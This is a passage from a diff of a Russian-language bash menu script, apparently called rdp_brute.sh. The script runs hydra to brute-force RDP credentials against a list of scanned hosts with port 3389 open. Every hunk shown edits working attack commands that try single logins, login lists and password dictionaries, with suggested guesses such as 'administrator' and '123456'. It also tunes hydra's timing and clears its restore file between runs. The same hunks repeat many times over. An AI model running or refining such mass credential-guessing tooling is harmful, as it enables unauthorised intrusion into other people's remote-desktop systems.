 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1889,7 +1973,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1899,7 +1983,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1908,7 +1992,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1936,6 +2020,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1947,7 +2035,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1957,7 +2045,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1967,7 +2055,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1976,7 +2064,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2004,6 +2092,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2015,7 +2107,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2025,7 +2117,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2035,7 +2127,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2044,7 +2136,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2073,6 +2165,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2084,7 +2180,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2094,7 +2190,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2104,7 +2200,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2113,7 +2209,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2141,6 +2237,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2152,7 +2252,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2162,7 +2262,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2172,7 +2272,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2181,7 +2281,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2210,6 +2310,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2221,7 +2325,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2231,7 +2335,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2241,7 +2345,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2250,7 +2354,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2279,6 +2383,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2290,7 +2398,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2300,7 +2408,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2310,7 +2418,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2319,7 +2427,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2348,6 +2456,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2359,7 +2471,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2369,7 +2481,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2379,7 +2491,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2388,7 +2500,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2417,6 +2529,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2428,7 +2544,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2438,7 +2554,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2448,7 +2564,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2457,7 +2573,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2486,6 +2602,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2497,7 +2617,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2507,7 +2627,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2517,7 +2637,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2526,7 +2646,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2555,6 +2675,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2566,7 +2690,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2576,7 +2700,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2586,7 +2710,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2595,7 +2719,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2623,6 +2747,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2634,7 +2762,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2644,7 +2772,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2654,7 +2782,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2663,7 +2791,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2692,6 +2820,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -2703,7 +2835,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -2713,7 +2845,7 @@ fi
